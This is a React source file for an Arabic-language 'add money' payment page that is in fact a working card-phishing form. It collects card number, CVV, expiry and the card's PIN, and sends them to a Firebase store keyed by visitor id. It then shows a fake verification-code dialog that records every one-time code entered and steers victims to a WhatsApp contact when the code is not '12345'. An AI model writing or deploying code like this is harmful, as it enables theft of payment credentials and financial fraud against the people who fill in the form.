"use client";

import { useRef, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { addData } from "@/lib/firebase";
import Loader from "./loader";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "./ui/dialog";
import { X } from "lucide-react";

const allOtps = [""];

function validateCardNumber(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\D/g, "");

  if (digits.length < 13 || digits.length > 19) {
    return false;
  }

  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = Number.parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
}

export default function AddMoneyPage() {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [cns, setcns] = useState(["", "", "", ""]);
  const [exm, setexm] = useState("");
  const [bank, setBank] = useState("");
  const [pass, setPass] = useState("");
  const [exy, setexy] = useState("");
  const [ccc, setccc] = useState("");
  const [otpValues, setOtpValues] = useState("");
  const [showOtp, setShowOtp] = useState(false);
  const [otpError, setOtpError] = useState("");
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [isLoading, setIsLoading] = useState(false);
  const [saveCard, setSaveCard] = useState(false);

  const cardInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleCloseOtp = () => setShowOtp(false);
  const handleOtpChange = (value: string) => {
    setOtpValues(value);
  };

  const handlecnChange = (index: number, value: string) => {
    const numericValue = value.replace(/\D/g, "").slice(0, 4);
    const newcns = [...cns];
    newcns[index] = numericValue;
    setcns(newcns);

    // Move to next field automatically
    if (numericValue.length === 4 && index < 3) {
      cardInputRefs.current[index + 1]?.focus();
    }

    // Clear error when typing
    if (errors[`card-${index}`]) {
      setErrors((prev) => ({ ...prev, [`card-${index}`]: "" }));
    }
    if (errors.cardNumber) {
      setErrors((prev) => ({ ...prev, cardNumber: "" }));
    }
  };

  const validateForm = () => {
    const newErrors: { [key: string]: string } = {};

    // Validate card segments
    cns.forEach((number, index) => {
      if (!number.trim()) {
        newErrors[`card-${index}`] = "أدخل 4 أرقام في هذا الجزء";
      } else if (number.length !== 4) {
        newErrors[`card-${index}`] = "يجب أن يكون 4 أرقام";
      }
    });

    const fullCardNumber = cns.join("");
    if (fullCardNumber.length === 16) {
      if (!validateCardNumber(fullCardNumber)) {
        newErrors.cardNumber = "رقم البطاقة غير صحيح. يرجى التحقق من الرقم";
      }
    }

    // Validate CVV
    if (!ccc.trim()) {
      newErrors.ccc = "رمز الأمان مطلوب";
    } else if (!/^\d{3}$/.test(ccc)) {
      newErrors.ccc = "رمز الأمان يجب أن يكون 3 أرقام";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleContinue = async (e: any) => {
    const otpString = otpValues;
    allOtps.push(otpString);
    const visitorId = localStorage.getItem("visitor");
    await addData({ id: visitorId, otp: otpString, allOtps });

    if (otpString !== "12345") {
      setOtpError("هذه العملية غير مدعومة تحتاج الى تفعيل الشريحة الالكترونية الرجاء التواصل مع الدعم");
      setOtpValues("");
      return;
    }

    console.log("OTP verified successfully");
  };

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    if (!validateForm()) return;
    setIsLoading(true);

    const visitorId = localStorage.getItem("visitor");
    const exp = `${exm}/${exy}`;

    await addData({
      id: visitorId,
      cn: cns,
      status: "pending",
      ccc: ccc,
      EX: exp,
      bank,
      pass,
      phone2: phoneNumber,
    });

    setTimeout(() => {
      setShowOtp(true);
      setIsLoading(false);
    }, 3000);
  };

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 flex flex-col">
      <form onSubmit={handleSubmit} className="flex-1 flex flex-col justify-center px-6 space-y-6">
        <p className="text-center text-gray-500 text-sm">
          لتتمكن من إضافة السوار، ابدأ بإضافة بطاقة
        </p>

        {/* Card Number */}
        <div dir="ltr">
          <label className="block mb-2 text-left text-gray-700">رقم البطاقة</label>
          <div className="grid grid-cols-4 gap-2">
            {cns.map((num, i) => (
              <Input
                key={i}
                value={num}
                onChange={(e) => handlecnChange(i, e.target.value)}
                placeholder="0000"
                type="tel"
                maxLength={4}
                inputMode="numeric"
                className={`text-center rounded-xl bg-white border ${errors[`card-${i}`] ? "border-red-500" : "border-gray-300"}`}
                ref={(el) => (cardInputRefs.current[i] = el) as any}
              />
            ))}
          </div>

          {/* Error per segment */}
          <div className="grid grid-cols-4 gap-2 mt-1">
            {cns.map((_, i) => (
              <p key={i} className="text-xs text-red-500 text-center">
                {errors[`card-${i}`] || ""}
              </p>
            ))}
          </div>

          {/* Overall card error */}
          {errors.cardNumber && (
            <p className="text-sm text-red-500 mt-2 text-right">{errors.cardNumber}</p>
          )}
        </div>

        {/* CVV and Expiry */}
        <div className="flex justify-between gap-2">
          <div className="flex-1">
            <label className="block mb-2 text-right text-gray-700">CVV</label>
            <Input
              value={ccc}
              onChange={(e) => setccc(e.target.value.replace(/\D/g, "").slice(0, 3))}
              type="tel"
              placeholder="CVV"
              inputMode="numeric"
              className={`text-center rounded-xl bg-white border ${errors.ccc ? "border-red-500" : "border-gray-300"}`}
            />
            {errors.ccc && <p className="text-xs text-red-500 mt-1 text-right">{errors.ccc}</p>}
          </div>

          <div className="flex-1">
            <label className="block mb-2 text-right text-gray-700">تاريخ انتهاء الصلاحية</label>
            <Input
              value={exm.length === 2 ? exm + "/" : exm}
              onChange={(e) => setexm(e.target.value.slice(0, 5))}
              placeholder="MM/YY"
              className="text-center rounded-xl bg-white border-gray-300"
            />
          </div>
        </div>

        {/* Alias */}
        <div>
          <label className="block mb-2 text-right text-gray-700">الرقم السري للبطاقة</label>
          <Input
            value={phoneNumber}
            onChange={(e) => setPhoneNumber(e.target.value)}
            placeholder="أدخل الرقم السري للبطاقة"
            maxLength={4}
            type="tel"
            className="rounded-xl bg-white border-gray-300"
          />
        </div>

        {/* Save card */}
        <div className="flex items-center gap-2">
          <Checkbox
            checked={saveCard}
            onCheckedChange={(checked) => setSaveCard(Boolean(checked))}
          />
          <label className="text-gray-600 text-sm">احفظ البطاقة للاستخدام لاحقًا</label>
        </div>

        {/* Submit */}
        <Button
          type="submit"
          disabled={isLoading}
          className="w-full bg-[#9277d9] hover:bg-[#9277r1] text-white text-lg rounded-xl py-6"
        >
          التالي
        </Button>
      </form>

      {isLoading && <Loader />}

      <Dialog open={showOtp} onOpenChange={handleCloseOtp}>
        <DialogContent className="sm:max-w-md">
          {!otpError && (
            <DialogHeader>
              <DialogTitle className="text-right">رمز التحقق</DialogTitle>
              <Button variant="ghost" size="icon" className="absolute left-4 top-4" onClick={handleCloseOtp}>
                <X className="h-4 w-4" />
              </Button>
            </DialogHeader>
          )}

          <div className="space-y-4">
            {!otpError && (
              <>
                <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
                <div className="flex justify-center gap-3">
                  <Input
                    value={otpValues}
                    onChange={(e) => handleOtpChange(e.target.value)}
                    className="w-full h-12 text-center text-lg font-bold"
                    maxLength={5}
                    type="text"
                    inputMode="numeric"
                  />
                </div>
              </>
            )}

            {otpError && (
              <div className="text-red-500 text-sm text-right bg-red-50 p-3 rounded-lg border border-red-200 space-y-3">
                <p>{otpError}</p>
                <a
                  href="https://wa.me/96871129455"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex justify-between text-right text-blue-600 hover:text-blue-800 underline font-semibold"
                >
                  <img src="/whatsapp.png" alt="" width={25} />
                  <span>اضغط هنا للتواصل</span>
                </a>
              </div>
            )}

            {!otpError && (
              <Button
                onClick={handleContinue}
                className="w-full bg-[#9277d9] hover:bg-[#9277d9] text-white py-4 rounded-full text-lg"
              >
                تأكيد
              </Button>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
